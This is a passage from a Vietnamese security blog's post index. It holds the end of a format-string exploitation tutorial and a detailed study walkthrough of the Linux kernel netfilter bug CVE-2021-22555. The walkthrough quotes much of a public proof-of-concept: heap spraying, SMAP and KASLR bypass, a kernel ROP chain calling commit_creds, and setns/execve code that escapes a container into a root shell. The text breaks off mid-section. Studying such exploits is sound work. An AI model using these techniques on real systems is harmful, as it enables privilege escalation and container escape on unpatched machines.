%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x. The wrong way to print user-controlled input: 925a72a0.00000000.946a01e7.00000030.000000c8.c2052148.947819a8.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.947a9700.c2051d60.945abab0.94781000.00000000.c2051de0.00000000.00000000. [*] test_val @ 0x92502010 = -72 0xffffffb8 Ta thấy dữ liệu trên stack đã được in ra theo từng nhóm 4 bytes, và 4 byte này theo thứ tự ngược do kiến trúc little-endian. Những bytes 0x25, 0x30, 0x38, 0x78, 0x2e dường như lặp lại nhiều lần. Cùng xem thử những byte này có giá trị là gì? 1 2 ➜ fmt git:(main) ✗ printf \u0026#34;\\x25\\x30\\x38\\x78\\x2e\\n\u0026#34; %08x. Như chúng ta có thể thấy, vùng nhớ này là giá trị của format-string. Vì hàm printf luôn nằm ở vị trí cao nhất trên stack frame và format-string có thể nằm ở bất kì đâu trên stack. Nó sẽ nằm dưới frame pointer hiện tại.\nReading from Arbitrary Memory Addresses Định dạng %s được dùng để đọc địa chỉ vùng nhớ bất kì. Vì nó có thể đọc dữ liệu của chuỗi định dạng ban đầu, một phần của chuỗi định dạng ban đầu có thể được sử dụng để cung cấp địa chỉ cho tham số định dạng %s, như được hiển thị ở đây: 1 2 3 4 5 6 ➜ fmt git:(main) ✗ ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The right way to print user-controlled input: AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x The wrong way to print user-controlled input: AAAAff9a1a6c.f7d7068c.08049234.f7d7976c.f7f6f110.ff9a1aac.ff9a1f24.00000003.00000000.f7fa3000.41414141 [*] test_val @ 0x0804c02c = -72 0xffffffb8 4 bytes của 0x41 cho thấy tham số thứ 11 là dữ liệu bắt dầu của chuỗi chúng ta nhập vào. Nếu chúng ta thay format-parameter thứ 4 thành %s thay vì %x, hàm printf sẽ in ra chuỗi tại địa chỉ 0x41414141. Việc này sẽ làm crash chương trình vì 0x41414141 là một địa chỉ không hợp lệ. Nhưng, nếu địa chỉ này hợp lệ, thì ta có thể đọc được chuỗi tại địa chỉ này. Ta dùng một chương trình có tên là getenvaddr để lấy địa chỉ của biến môi trường PATH. ","description":"Khai thác format string là một kĩ thuật cho phép bạn chiếm quyền kiểm soát của một chương trình đặc quyền.... ","id":2,"section":"posts","tags":["exploitation"],"title":"Khai thác lỗi Format Strings","uri":"https://minhlongmt183.github.io/posts/format-string/"},{"content":"\rBài viết này nhằm mục đích học tập cá nhân, ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2021-22555: Turning \\x00\\x00 into 10000$, phần lớn là dịch từ bài viết gốc cộng thêm một số lí giải của tôi.\rTổng quan về lỗ hổng Lỗ hỗng cho phép viết dữ liệu bên ngoài vùng cho phép trên heap (heap out-of-bound) Những phiên bản bị ảnh hưởng: Linux kernel *v2.6.19-rc1 - v5.12-rc8 Môi trường thực thi, kiểm thử Ubuntu 20.04 Linux kernel: 5.8.0-48-gen Phân tích lỗ hổng Lỗ hổng được xác định nằm ở trong hàm xt_compat_target_from_user của /net/netfilter/x_tables.c: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr, unsigned int *size) { const struct xt_target *target = t-\u0026gt;u.kernel.target; struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t; int pad, off = xt_compat_target_offset(target); u_int16_t tsize = ct-\u0026gt;u.user.target_size; char name[sizeof(t-\u0026gt;u.user.name)]; t = *dstptr; memcpy(t, ct, sizeof(*ct)); if (target-\u0026gt;compat_from_user) target-\u0026gt;compat_from_user(t-\u0026gt;data, ct-\u0026gt;data); else memcpy(t-\u0026gt;data, ct-\u0026gt;data, tsize - sizeof(*ct)); pad = XT_ALIGN(target-\u0026gt;targetsize) - target-\u0026gt;targetsize; if (pad \u0026gt; 0) memset(t-\u0026gt;data + target-\u0026gt;targetsize, 0, pad); tsize += off; t-\u0026gt;u.user.target_size = tsize; strlcpy(name, target-\u0026gt;name, sizeof(name)); module_put(target-\u0026gt;me); strncpy(t-\u0026gt;u.user.name, name, sizeof(t-\u0026gt;u.user.name)); *size += off; *dstptr += tsize; } tại line 17-18 chương trình sao chép pad kí tự 0 vào vùng nhớ bắt đầu bằng t-\u0026gt;data + target-\u0026gt;targetsize. Trong trường hợp này, target-\u0026gt;targetsize không bị kiểm tra, do đó nó có thể chứa bất kì giá trị nào, kể cả giá trị âm. Chúng ta không thể kiểm soát được giá trị của target-\u0026gt;targetsize nhưng có thể sử dụng nhiều target với nhiều kích thước khác nhau bởi tên của chúng. Ví dụ như (TCPMSS, TTL, NFQUEUE) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 // net/netfilter/x_NFLOG.c static struct xt_target nflog_tg_reg __read_mostly = { .name = \u0026#34;NFLOG\u0026#34;, .revision = 0, .family = NFPROTO_UNSPEC, .checkentry = nflog_tg_check, .destroy = nflog_tg_destroy, .target = nflog_tg, .targetsize = sizeof(struct xt_nflog_info), .me = THIS_MODULE, }; // net/netfilter/x_NFQUEUE.c static struct xt_target nfqueue_tg_reg[] __read_mostly = { { .name = \u0026#34;NFQUEUE\u0026#34;, .family = NFPROTO_UNSPEC, .target = nfqueue_tg, .targetsize = sizeof(struct xt_NFQ_info), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 1, .family = NFPROTOR_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v1, .targetsize = sizeof(struct xt_NFQ_info_v1), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 2, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .target = nfqueue_tg_v2, .targetsize = sizeof(struct xt_NFQ_info_v2), .me = THIS_MODULE, }, { .name = \u0026#34;NFQUEUE\u0026#34;, .revision = 3, .family = NFPROTO_UNSPEC, .checkentry = nfqueue_tg_check, .targetsize = sizeof(struct xt_NFQ_info_v3), .me = THIS_MODULE, }, }; target size không được căn chỉnh 8 bytes để điền khi pad \u0026gt; 0, do đó, target size càng lớn thì offset càng lớn. target size có kích thước lớn nhất mà tác giả tìm được là NFLOG, với nó, chúng ta có thể chọn offset lên đến 0x4c out-of-bounds (chúng ta có thể thay đổi offset bằng cách thêm padding vào giữa 2 cấu trúc struct xt_entry_match và struct xt_entry_target): 1 2 3 4 5 6 7 8 9 struct xt_nflog_info{ /* \u0026#39;len\u0026#39; will be used iff you set XT_NFLOG_F_COPY_LEN in flags */ __u32 len; __u16 group; __u16 threshold; __u16 flags; __u16 pad; char prefix[64]; }; Bên cạnh đó, t-\u0026gt;data được cấp phát bởi hàm xt_alloc_table_info trong /net/netfilter/x_tables.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 struct xt_table_info *xt_alloc_table_info(unsigned int size) { struct xt_table_info *info = NULL; size_t sz = sizeof(*info) + size; if (sz \u0026lt; sizeof(*info) || sz \u0026gt;= XT_MAX_TABLE_SIZE) return NULL; info = kvmalloc(sz, GFP_KERNEL_ACCOUNT); if (!info) return NULL; memset(info, 0, sizeof(*info)); info-\u0026gt;size = size; return info; } Vùng nhớ được ghi cấp phát ở line 9 với flag GFP_KERNEL_ACCOUNT và kích thước là sz\nMặc dù vậy, kích thước tối thiểu \u0026gt; 0x100, có nghĩa kích thước nhỏ nhất của đối tượng có thể cấp phát là kmalloc-512. Chúng ta tìm đối tượng được cấp phát giữa kmalloc-512 và kmalloc-8192 để khai thác.\nTại sao biết 0x100? size là đối tượng chúng ta truyền vào, do đó, để biết cần trace xem hàm này được gọi ở đâu? Vì kích thước của struct xt_table_info = 0x100\rKích thước SIZE này chúng ta kiểm soát được bằng cách tìm xem hàm xt_alloc_table_info được gọi, ví dụ như hàm static int compat_do_replace(): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 static int compat_do_replace(struct net *net, void __user *user, unsigned int len) { int ret; struct compat_ipt_replace tmp; struct xt_table_info *newinfo; void *loc_cpu_entry; struct ipt_entry *iter; if (copy_from_user(\u0026amp;tmp, user, sizeof(tmp)) != 0) // size của tmp được xác địn bởi user return -EFAULT; /* overflow check */ if (tmp.num_counters \u0026gt;= INT_MAX / sizeof(struct xt_counters)) return -ENOMEM; if (tmp.num_counters == 0) return -EINVAL; tmp.name[sizeof(tmp.name)-1] = 0; newinfo = xt_alloc_table_info(tmp.size); // size của tmp được truyền vào ...... } Vì t-\u0026gt;data chúng ta có thể kiểm soát được thông qua size, nên bây giờ ta tìm cách đưa nó về cuối cùng của heap block. Ta xem xét hàm compat_copy_entry_from_user 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static void compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr, unsigned int *size, struct xt_table_info *newinfo, unsigned char *base) { struct xt_entry_target *t; struct ipt_entry *de; unsigned int origsize; int h; struct xt_entry_match *ematch; origsize = *size; de = *dstptr; memcpy(de, e, sizeof(struct ipt_entry)); memcpy(\u0026amp;de-\u0026gt;counters, \u0026amp;e-\u0026gt;counters, sizeof(e-\u0026gt;counters)); *dstptr += sizeof(struct ipt_entry); *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry); xt_ematch_foreach(ematch, e) xt_compat_match_from_user(ematch, dstptr, size); de-\u0026gt;target_offset = e-\u0026gt;target_offset - (origsize - *size); t = compat_ipt_get_target(e); xt_compat_target_from_user(t, dstptr, size); de-\u0026gt;next_offset = e-\u0026gt;next_offset - (origsize - *size); for (h = 0; h \u0026lt; NF_INET_NUMHOOKS; h++) { if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;hook_entry[h]) newinfo-\u0026gt;hook_entry[h] -= origsize - *size; if ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;underflow[h]) newinfo-\u0026gt;underflow[h] -= origsize - *size; } } Chúng ta thấy tại line 15 dòng lệnh *dstptr += sizeof(struct ipt_entry); sẽ đẩy con trỏ t-\u0026gt;data về phía cuối của heap gần hơn. Sau đó, trong hàm xt_compat_match_from_user tại line 25, con trỏ dstptr tiếp tục được cộng *dstptr += msize làm cho t-\u0026gt;data thêm một lần nữa chạy gần về phía cuối heap hơn. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr, unsigned int *size) { const struct xt_match *match = m-\u0026gt;u.kernel.match; struct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m; int pad, off = xt_compat_match_offset(match); u_int16_t msize = cm-\u0026gt;u.user.match_size; char name[sizeof(m-\u0026gt;u.user.name)]; m = *dstptr; memcpy(m, cm, sizeof(*cm)); if (match-\u0026gt;compat_from_user) match-\u0026gt;compat_from_user(m-\u0026gt;data, cm-\u0026gt;data); else memcpy(m-\u0026gt;data, cm-\u0026gt;data, msize - sizeof(*cm)); pad = XT_ALIGN(match-\u0026gt;matchsize) - match-\u0026gt;matchsize if (pad \u0026gt; 0) memset(m-\u0026gt;data + match-\u0026gt;matchsize, 0, pad); msize += off; m-\u0026gt;u.user.match_size = msize; strlcpy(name, match-\u0026gt;name, sizeof(name)); module_put(match-\u0026gt;me); strncpy(m-\u0026gt;u.user.name, name, sizeof(m-\u0026gt;u.user.name)); *size += off; *dstptr += msize; } và msize được kiểm soát bằng cách xây dựng cấu trúc dữ liệu ở tầng user. Do đó, chúng ta có một chiến lược, là kiểm soát msize -\u0026gt; dstptr-\u0026gt;t-\u0026gt;data về cuối cùng của heap block, sau đó kiểm soát target-\u0026gt;targetsize để ghi vào nội dung vào heap block tiếp theo.\nKhai thác lỗ hổng struct msg_msg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // include/linux/msg.h /* one msg_msg struct for each message */ struct msg_msg{ struct list_head m_list; long m_type; size_t m_ts; /* message text size */ struct *security; /* the actual message follows immediately */ }; // include/linux/types.h struct list_head { struct list_head *next, *prev; }; // ipc/msgutils.c struct msg_msgseg{ struct msg_msgseg *next; /* The next part of the message follow immediately*/ }; struct msg_msg được cấp phát bởi lời gọi hệ thống msgsnd trong ipc/msgutil.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 static struct msg_msg *alloc_msg(size_t len) { struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); if (msg == NULL) return NULL; msg-\u0026gt;next = NULL; msg-\u0026gt;security = NULL; len -= alen; pseg = \u0026amp;msg-\u0026gt;next; while (len \u0026gt; 0){ struct msg_msgseg *seg; cond_resched(); alen = min(len, DATALEN_SEG); seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); if (seg == NULL) goto out_err; *pseg = seg; pseg = \u0026amp;seg-\u0026gt;next; len -= alen; } return msg; out_err: free_msg(msg); return NULL; } len là kích thước dữ liệu của cấu trúc msg_msg.\nTạo ra UAF Nhiều message queues được tạo khi sử dụng msgget(). Sau đó, sử dụng msgsnd() để gửi message với kích thước 4096 cho mỗi message queue. Cuối cùng, sau khi gửi một số lượng lớn các messages, một số cấu trúc struct msg_msg trong message queue được cấp phát liên tục trên heap.\n. Sau đó, msgsnd để gửi một message có kích thước 1024 tới mỗi message queue. Message có kích thước 1024 sẽ xâu chuỗi với message kích thước 4096 và lưu trong thành phần struct list_head của struct msg_msg.\n. Khi gọi msgrcv để đọc các phần của 4096 message, nó sẽ giải phóng vùng nhớ mà cấu trúc msg_msg đã giữ trên heap.\n. Cuối cùng, khi gọi hàm xt_alloc_table_info để dùng cho những block 4096 trên heap thì nó đã bị giải phóng ở bước trước đó. Lí tưởng, chúng ta không nên giải phóng cấu trúc A ngày sau 4096 heap block để khi gọi xt_alloc_table_info chúng ta có thể sử dụng out-of-bounds để viết mã trỏ tới những byte cuối của cấu trúc struc msg_msg A m_list.next = 0.\n. Có một cơ hội rằng 2 4096 struct msg_msg cùng trỏ tới cung cấu trúc 1024 struct msg_msg B, nó sẽ tham khảo tới một cấu trúc 4096 struct msg_msg khác và UAF sẽ xuất hiện.\n. Để xác định cấu trúc struct msg_msg B có đang bị trỏ tới 2 lần hay không, ta gửi message có nội dung tương ứng với số thứ tự của message: ví dụ mesage 1 có nội dung là 1, message 2 có nội dung là 2, \u0026hellip;. message thứ 4096 có nội dung là 4096. Khi lỗi xảy ra, mỗi message của hàng đợi đều được đọc qua, nếu tính năng nào của cấu trúc B có nội dung không tương ứng với chỉ mục, có nghĩa nó không nằm trong hàng đợi, điều này cũng có nghĩa cấu trúc B đang tồn tại 2 struct trỏ tới nó. Bypass SMAP Đến đây, struct msg_msg B đang bị double referemced, cái thứ nhất giải phóng thằng B, và cái còn lại trò tới B chúng ta có thể kiểm soát được. Bây giờ chúng ta dùng hàm socketpair() để spray heap, spray lượng lớn các message với kích thước 1024 và tạo ra một fake struct struct msg_msg structure. lý tưởng chúng ta có thể phục hồi cấu trúc msg_msg B đã bị giải phóng.\nChú ý rằng mlist.next là 41414141 vì chúng ta không biết địa chỉ của kernel (khi SMAP được bật, chúng ta không thể tính ra địa chỉ cụ thể của user). Không có địa chỉ của kernel thì rất quan trọng vì nó làm chúng ta không thể giải phóng vùng nhớ 1 lần nữa. Nguyên nhân là trong khi hàm msgrcv(), message dược hủy liên kết khỏi hàng đợi là một danh sách vòng tròn. Một số trường của cấu trúc struct msg_msg cho phép chúng ta leak được những thông tin này. Cụ thể, trường m_ts được dùng để xác định lượng dữ liệu trả về cho userland: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/ipc/msgutil.c struct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst) { struct msg_msgseg *dst_pseg, *src_pseg; size_t len = src-\u0026gt;m_ts; size_t alen; if (src-\u0026gt;m_ts \u0026gt; dst-\u0026gt;m_ts) return ERR_PTR(-EINVAL); alen = min(len, DATALEN_MSG); memcpy(dst + 1, src + 1, alen); ... return dst; } Kích thước ban đầu của message này là 1024-sizeof(struct msg_msg) bytes, chúng ta có thể tạo DATALEN_MSG=4096-xizeof(struct msg_msg). Do đó chúng ta có thể leak được thông tin từ header của struct msg_msg trong message kế tiếp. message queue được hiện thực nhưng 1 danh sách vòng tròn, do đó, mlist.next sẽ trỏ về message chính.\nKhi biết được địa chỉ của message chính, chúng ta có thể tạo lại fake strct msg_msg với đại chỉ là next (segment tiếp theo). Nội dung của message chính có thể được leak bằng cách đọc nhiều hơn DATALEN_MSG bytes. Địa chỉ của con trỏ mlist.next được leak từ message chính sẽ tiết lộ đại chỉ cảu message thứ 2, nó nằm kề cấu trúc struct msg_msg mà chung ta muốn làm giả. Lấy địa chỉ này từ đi 1024 chúng ta sẽ có được địa chỉ của message mà chúng ta muốn kiểm soát.\nvẫn chưa hiểu primary message là gì? trỏ như thế nào? Đọc kĩ hơn phần phân tích POC, flow thì sẽ hiểu rõ\rMột user-after-free tốt hơn. Tới đây chúng ta phải xây dựng được một cấu trúc giả struct msg_msg với địa chỉ leak được là mlist.next và mlist.prev (nghĩa là nó tự trỏ tới chính nó), bây giờ làm sao để fake message bị free trong hàng đợi fake message -queue. Khi sử dụng unix sockets, chúng ta có một đối tượng struct sk_buff trỏ tới fake message. Điều này có nghĩa khi chúng ta giải phóng tin nhắn giả của mình, tham thảo tới nó vẫn còn tồn ở đó.\ndữ liệu của vùng nhớ trên struct sk_buff là một chất liệu tuyệt vời để khai thác, vì nó không chưa thông tin tiêu đề nào, nghĩa là chúng ta có thể sử dụng nó để giải phóng bất kì đối tượng nào trên vùng nhớ này. Trong khi đó, nếu so sánh với kịch bản uaf thì chúng ta phải giải phóng đối tượng struct msg_msg, điều này chỉ được thực hiện nếu hai phần tử đầu tiên của con trỏ có thể ghi được Tìm đối tượng khai thác Đối tượng khai thác tốt nhất là đối tượng có con trỏ hàm trong cấu trúc này. Victim phải cấp phát với GFP_KERNEL_ACCOUNt\nCấu trúc struct pipe_buffer được cấp phát tròng kmalloc-1024 (đây là lí do tại sao mesage thứ 2 là 1024 bytes). Cấu trúc struct pipe_buffer có thể được cấp phát dễ dàng với pipe() mà có hàm alloc_pipe_info() như một chương trình con: 1 2 3 4 5 6 7 8 9 10 11 12 13 // https://git.kernel.org/pub/scm/linux/kernel/git/torvals/linux.git/tree/fs/pipe.c struct pipe_inode_info *alloc_pipe_info(void) { ... unsigned long pipe_bufs = PIPE_DEF_BUFFERS; ... pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); if (pipe == NULL) goto out_free_uid; ... pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); ... } Nó không trực tiếp chứa con trỏ hàm, nó chứa con trỏ tới cấu trúc struct pipe_buf_operations mà cấu trúc này lại có con trỏ hàm mà chúng ta cần:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h struct pipe_buffer{ struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; struct pipe_buf_operations { ... /* * When The contents of this pipe buffer has been completely * consumed by a reader, -\u0026gt;release() is called. */ void (*release)(struct pipe_node_info *, struct pipe_buffer *); ... }; Bypassing KASLR/SMEP Khi viết vào pipes, câu trúc struct pipe_buffer bị ghi đè, trong đó ops nó trỏ tới một cấu trúc tĩnh nằm trên .data segment: anon_pipe_buf_ops:\n1 2 3 4 5 6 // https://git.kernel.org/pub/scm/linux/kernel/git/tovalds/linux.git/tree/fs/pipe.c static const struct pipe_buf_operations alloc_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; Vì khoảng cách giữa địa chỉ của .data segment và .text không đổi, nên ta tính được địa chỉ của kernel_base_addr từ anon_pipe_buf_ops.\nTính như thế nào? Mô tả ở phần POC\rPhun nhiều cấu trúc struct pipe_buffer và chỉnh sửa lại vị tyris của cấu trúc struct sk_buff của data buffer.\nChúng ta đọc dữ liệu từ sk_buff để leak nội dụng của struct pipe_buffer và lấy đại chỉ của anon_pipe_buf_ops\nVới thông tin này, chúng ta sẽ tìm JOP/ROP gadgets. Khi đọc từ unix socket, chúng ta cần giải phóng vùng nhớ của nó.\nNâng quyền Tạo một cấu trúc struct pipe_buffer với mộ con trỏ ops trỏ tới một cấu trúc struct pipe_buf_operations. Cấu trúc này đặt tại cùng địa điểm vì chúng ta biết địa chỉ của nó, chứa hàm mà chúng ta muốn thực thi khi được giải phóng.\nCuối cùng, đóng hết tất cả các pipes =\u0026gt; kích hoạt giải phóng vùng nhớ =\u0026gt; kích hoạt JOP chain. Kernel ROP chain Lưu địa chỉ của RBP tại một só địa chỉ trong kernel để sử dụng khi thực thi\n=\u0026gt; gọi commit_creds(prepare_kernel_cred(NULL)) để install kernel credentials\n=\u0026gt; gọi switch_task_namespace(find_task_by_vpid(1), init_nsproxy) để chuyển không gian tên của tiến trình 1 tới 1 trong những tiến trình khởi tạo.\n=\u0026gt; khô phục giá trị của RBP và trả về thực thi đã dừng (free_pipe_info() trả về). Thoát container và nhảy vào root shell 1 2 3 4 5 6 setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); Phân tích POC Tiếp theo, chúng ta sẽ đi phân tích poc của Andy Nguyen\nNhư demo, poc của anh Any Nguyen cho thấy rất rõ các bước để khai thác từ việc khởi tạo ở STAGE0 đến làm tràn bộ nhớ ở STAGE1, vượt qua SMAP, KSALR, thực thi mã khai thác và thoát khỏi container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 [+] Linux Privilege Escalation by theflow@ - 2021 [+] STAGE 0: Initialization [*] Setting up namespace sandbox... [*] Initializing sockets and message queues... [+] STAGE 1: Memory corruption [*] Spraying primary messages... [*] Spraying secondary messages... [*] Creating holes in primary messages... [*] Triggering out-of-bounds write... [*] Searching for corrupted primary message... [+] fake_idx: ffc [+] real_idx: fc4 [+] STAGE 2: SMAP bypass [*] Freeing real secondary message... [*] Spraying fake secondary messages... [*] Leaking adjacent secondary message... [+] kheap_addr: ffff91a49cb7f000 [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Leaking primary message... [+] kheap_addr: ffff91a49c7a0000 [+] STAGE 3: KASLR bypass [*] Freeing fake secondary messages... [*] Spraying fake secondary messages... [*] Freeing sk_buff data buffer... [*] Spraying pipe_buffer objects... [*] Leaking and freeing pipe_buffer object... [+] anon_pipe_buf_ops: ffffffffa1e78380 [+] kbase_addr: ffffffffa0e00000 [+] STAGE 4: Kernel code execution [*] Spraying fake pipe_buffer objects... [*] Releasing pipe_buffer objects... [*] Checking for root... [+] Root privileges gained. [+] STAGE 5: Post-exploitation [*] Escaping container... [*] Cleaning up... [*] Popping root shell... STAGE0 - Khởi tạo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 printf(\u0026#34;[+] STAGE 0: Initialization\\n\u0026#34;); printf(\u0026#34;[*] Setting up namespace sandbox...\\n\u0026#34;); if (setup_sandbox() \u0026lt; 0) goto err_no_rmid; printf(\u0026#34;[*] Initializing sockets and message queues...\\n\u0026#34;); if ((s = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) { perror(\u0026#34;[-] socket\u0026#34;); goto err_no_rmid; } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) \u0026lt; 0) { perror(\u0026#34;[-] socketpair\u0026#34;); goto err_no_rmid; } } for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) \u0026lt; 0) { perror(\u0026#34;[-] msgget\u0026#34;); goto err_no_rmid; } } printf(\u0026#34;\\n\u0026#34;); msqid stand for: Message queue identifier,\rHàm setup_sandbox() có tác thiết lập giới hạn của CPU (dòng 11-17) nhằm mục đích phục có quá trình spray các message. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 int setup_sandbox(void) { if (unshare(CLONE_NEWUSER) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWUSER)\u0026#34;); return -1; } if (unshare(CLONE_NEWNET) \u0026lt; 0) { perror(\u0026#34;[-] unshare(CLONE_NEWNET)\u0026#34;); return -1; } cpu_set_t set; CPU_ZERO(\u0026amp;set); CPU_SET(0, \u0026amp;set); if (sched_setaffinity(getpid(), sizeof(set), \u0026amp;set) \u0026lt; 0) { perror(\u0026#34;[-] sched_setaffinity\u0026#34;); return -1; } return 0; } Lưu ý, hàm unshare ở dòng 2 và 6 có thể bị chặn bởi cơ chế Seccomp trên docker. Khi đó, hoặc bạn có thể không gọi hai lệnh này, hoặc bạn có thể chạy docker với tùy chọn --security-opt seccomp=unconfined:\n1 2 docker run --rm -it --security-opt seccomp=unconfined debian:jessie \\ unshare --map-root-user --user sh -c whoami Sau đó, chúng ta khởi tạo socket, tạo socketpair (dòng 14-19) và dùng hàm msgget() để tạo hàng đợi messages (dòng 21-26) STAGE1 - Làm tràn bộ nhớ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 printf(\u0026#34;[+] STAGE 1: Memory corruption\\n\u0026#34;); printf(\u0026#34;[*] Spraying primary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_primary, 0, sizeof(msg_primary)); *(int *)\u0026amp;msg_primary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_primary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { memset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary)); *(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG; *(int *)\u0026amp;msg_secondary.mtext[4] = i; if (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), MTYPE_SECONDARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;); for (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) { if (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt; 0) goto err_rmid; } printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;); if (trigger_oob_write(s) \u0026lt; 0) goto err_rmid; printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { if (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0) continue; if (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0) goto err_no_rmid; if (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } if (*(int *)\u0026amp;msg_secondary.mtext[4] != i) { fake_idx = i; real_idx = *(int *)\u0026amp;msg_secondary.mtext[4]; break; } } if (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) { printf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;); goto err_no_rmid; } // fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly // pointing to real_idx\u0026#39;s secondary message. printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx); printf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx); printf(\u0026#34;\\n\u0026#34;); Spraying primary messages Cấu trúc của primary messages được xây 